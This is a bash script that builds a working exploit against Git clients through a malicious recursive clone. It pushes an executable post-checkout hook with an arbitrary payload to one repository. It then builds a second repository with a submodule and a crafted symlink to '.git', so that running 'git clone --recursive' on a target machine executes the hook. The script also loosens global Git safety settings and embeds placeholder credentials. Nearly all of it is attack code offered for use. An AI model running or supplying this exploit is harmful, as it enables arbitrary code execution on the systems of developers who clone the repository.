#!/bin/bash

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
# to avoid the warning message
git config --global init.defaultBranch main

# Create 2 new repos in your git hosting site (github,gitlab,bitbucket,gitea...etc) and  Set These Values:
hook_repo_path="http://gitea.mydomain.com:3000/test/hook.git"
exploit_repo_path="http://gitea.mydomain.com:3000/test/exploit.git"
payload=""

# Git credentials
git_username="test"
git_password="test1234"

# Extracting variables
hook_scheme="${hook_repo_path%%://*}://"
hook_dir_name=$(basename -s .git "$hook_repo_path") # Directory name
hook_rest_of_url="${hook_repo_path#*://}"

exploit_scheme="${exploit_repo_path%%://*}://"
exploit_dir_name=$(basename -s .git "$exploit_repo_path") # Directory name
exploit_rest_of_url="${exploit_repo_path#*://}"

# Cloning hook repository
git clone "$hook_repo_path"
cd "$hook_dir_name" || { echo "Failed to change directory to $hook_dir_name"; exit 1; }

# Creating a hook that will serve our exploit
mkdir -p y/hooks

# New exploit
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
EOF

echo -n "$payload" >> y/hooks/post-checkout

# Making the hook executable
chmod +x y/hooks/post-checkout

# Adding to git, committing, and pushing to remote repo
git add y/hooks/post-checkout
git commit -m "Hook-Added"
git push "${hook_scheme}${git_username}:${git_password}@${hook_rest_of_url}"

# Leaving Hook Repo
cd ..


# Cloning exploit repository
git clone "$exploit_repo_path"
cd "$exploit_dir_name" || { echo "Failed to change directory to $exploit_dir_name"; exit 1; }

# Adding the submodule that will point to hook
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "Submodule-Added"

# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info

# Committing and pushing
git commit -m "Symlink-Added"
git push "${exploit_scheme}${git_username}:${git_password}@${exploit_rest_of_url}"

# Leaving Exploit Repo
cd ..

# Command on target system for exploitation
# git clone --recursive "$exploit_repo_path" exploit
